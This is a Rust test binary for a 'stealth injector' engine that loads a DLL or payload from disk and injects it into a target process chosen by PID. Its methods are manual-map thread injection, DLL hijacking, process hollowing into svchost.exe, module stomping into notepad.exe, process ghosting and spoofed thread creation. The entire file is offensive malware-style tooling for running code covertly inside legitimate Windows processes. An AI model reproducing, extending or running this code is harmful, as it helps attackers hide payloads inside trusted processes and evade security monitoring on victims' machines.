use std::env;
use std::fs;

#[path = "../stealth.rs"]
mod stealth;

fn main() -> anyhow::Result<()> {
    println!("=== Stealth Injector Test Binary ===");

    // 1. Initialize Stealth Engine
    if !stealth::init_stealth_engine() {
        println!("[-] Failed to initialize stealth engine.");
        return Ok(());
    }
    
    let engine = stealth::get_engine().expect("Engine should be available");
    println!("[+] Stealth Engine Initialized at 0x{:x}", engine.base_addr);

    // 2. Parse arguments
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("Usage: test_injector.exe <PID> <DLL_PATH> [method: hijack|thread (default: thread)]");
        return Ok(());
    }

    let pid_str = args.get(1).expect("PID required");
    let dll_path = args.get(2).expect("DLL path required");
    let method = args.get(3).map(|s| s.as_str()).unwrap_or("thread");

    let pid: u32 = pid_str.parse().expect("Invalid PID");

    println!("[*] Target PID: {}", pid);
    println!("[*] DLL Path: {}", dll_path);

    // 3. Read DLL
    let dll_bytes = fs::read(dll_path).expect("Could not read DLL file");
    println!("[+] Read {} bytes from {}", dll_bytes.len(), dll_path);

    // 4. Manual Map Injection / Shellcode Injection
    println!("[*] Executing injection (Method: {})...", method);
    unsafe {
        let result = if method == "hijack" {
            engine.manual_map_dll_hijack(pid, &dll_bytes)
        } else if method == "hollow" {
            if pid == 0 {
                println!("[*] Hollowing payload into a new svchost.exe process...");
                match engine.spawn_hollow_process(&dll_bytes, "C:\\Windows\\System32\\svchost.exe") {
                    Ok(h) => { println!("[+] Hollowing process handle: 0x{:x}", h.0 as usize); Ok(()) },
                    Err(e) => Err(e)
                }
            } else {
                engine.hollow_shellcode(pid, &dll_bytes)
            }
        } else if method == "stomp" {
            if pid == 0 {
                println!("[*] Module Stomping payload into a new notepad.exe process...");
                match engine.spawn_stomp_process(&dll_bytes, "C:\\Windows\\System32\\notepad.exe") {
                    Ok(h) => { println!("[+] Stomping process handle: 0x{:x}", h.0 as usize); Ok(()) },
                    Err(e) => Err(e)
                }
            } else {
                engine.manual_map_dll_stomp(pid, &dll_bytes)
            }
        } else if method == "ghost" {
            // Usage: test_injector.exe 0 <EXE_PATH> ghost
            println!("[*] Ghosting payload as a process...");
            match engine.spawn_ghost_process(&dll_bytes, "C:\\Windows\\System32\\svchost.exe") {
                Ok(h) => { println!("[+] Ghost process handle: 0x{:x}", h.0 as usize); Ok(()) },
                Err(e) => Err(e)
            }
        } else if method == "thread_spoof" {
             let h_proc = (engine.get_handle)(pid);
             let entry = (engine.manual_map)(h_proc, dll_bytes.as_ptr() as *const _);
             if entry != 0 {
                 let status = (engine.create_thread_ex)(h_proc, entry as *mut std::ffi::c_void, std::ptr::null(), true);
                 if status == 0 { Ok(()) } else { Err(anyhow::anyhow!("Spoofed thread failed: {}", status)) }
             } else { Err(anyhow::anyhow!("Mapping failed")) }
        } else {
            engine.manual_map_dll_thread(pid, &dll_bytes)
        };

        match result {
            Ok(_) => println!("[+] Injection appeared successful! Check the target process."),
            Err(e) => println!("[-] Injection failed: {}", e),
        }
    }

    println!("[*] Test complete.");
    Ok(())
}
